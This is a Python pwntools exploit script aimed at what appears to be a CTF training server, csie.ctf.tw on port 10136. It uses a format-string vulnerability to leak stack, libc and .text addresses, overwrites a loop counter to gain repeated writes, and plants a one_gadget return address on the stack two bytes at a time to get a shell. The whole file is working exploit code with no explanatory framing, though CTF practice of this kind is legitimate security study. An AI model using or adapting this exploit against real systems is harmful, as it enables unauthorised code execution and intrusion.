#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

### Use argv chain to pwn
host = 'csie.ctf.tw'
port = 10136
r = remote(host, port)

def fmt(prev, val, idx, byte=1):
    result = ""
    if val > prev:
        result += '%' + str(val - prev) + 'c'
    elif val == prev:
        result += ''
    else:
        result += '%' + str(val - prev + 256**byte) + 'c'
    result += '%' + str(idx)
    if byte == 1:
        result += '$hhn'
    elif byte == 2:
        result += '$hn'
    elif byte == 4:
        result += '$n'
    return result

def write_gadget(target, gadget):
    r.recvuntil(":")
    payload = fmt(0, target & 0xffff, 11, 2)
    r.sendline(payload)
    r.recvuntil(":")
    payload = fmt(0, gadget & 0xffff, 37, 2)
    r.sendline(payload)

    target += 2
    r.recvuntil(":")
    payload = fmt(0, target & 0xffff, 11, 2)
    r.sendline(payload)
    r.recvuntil(":")
    payload = fmt(0, (gadget >> 16) & 0xffff, 37, 2)
    r.sendline(payload)

    target += 2
    r.recvuntil(":")
    payload = fmt(0, target & 0xffff, 11, 2)
    r.sendline(payload)
    r.recvuntil(":")
    payload = fmt(0, (gadget >> 32) & 0xffff, 37, 2)
    r.sendline(payload)

    target += 2
    r.recvuntil(":")
    payload = fmt(0, target & 0xffff, 11, 2)
    r.sendline(payload)
    r.recvuntil(":")
    payload = fmt(0, (gadget >> 48) & 0xffff, 37, 2)
    r.sendline(payload)

# Modify index of for loop to make it to infinite format string
r.recvuntil(":")
r.sendline("%11$p")
idx_addr = int(r.recv().strip(), 0) - 0xec
print "[*] Leak address of index of loop", hex(idx_addr)

r.recvuntil(":")
payload = fmt(0, idx_addr & 0xffff, 11, 2)
r.sendline(payload)

r.recvuntil(":")
payload = fmt(0, 255, 37, 1)
r.sendline(payload)

# Leak libc base address
r.recvuntil(":")
r.sendline("%9$p")
libc_start_main = int(r.recv().strip(), 0) - 240
libc = libc_start_main - 0x20740
print "[*] Leak libc base address", hex(libc)

# Leak .text section base address
r.recvuntil(":")
r.sendline("%8$p")
text = int(r.recv().strip(), 0) - 0x250
print "[*] Leak text section base address", hex(text)

# Write ROP to stack, write 2 byte each time
one_gadget = libc + 0x4526a
target = idx_addr - 0x4 - 0x8
write_gadget(target, one_gadget)

ret = ((text >> 12) << 12) + 0x7c1
r.recvuntil(":")
payload = fmt(0, (target - 0x8) & 0xffff, 11, 2)
r.sendline(payload)
r.recvuntil(":")
payload = fmt(0, ret & 0xffff, 37, 2)
r.sendline(payload)
r.interactive()
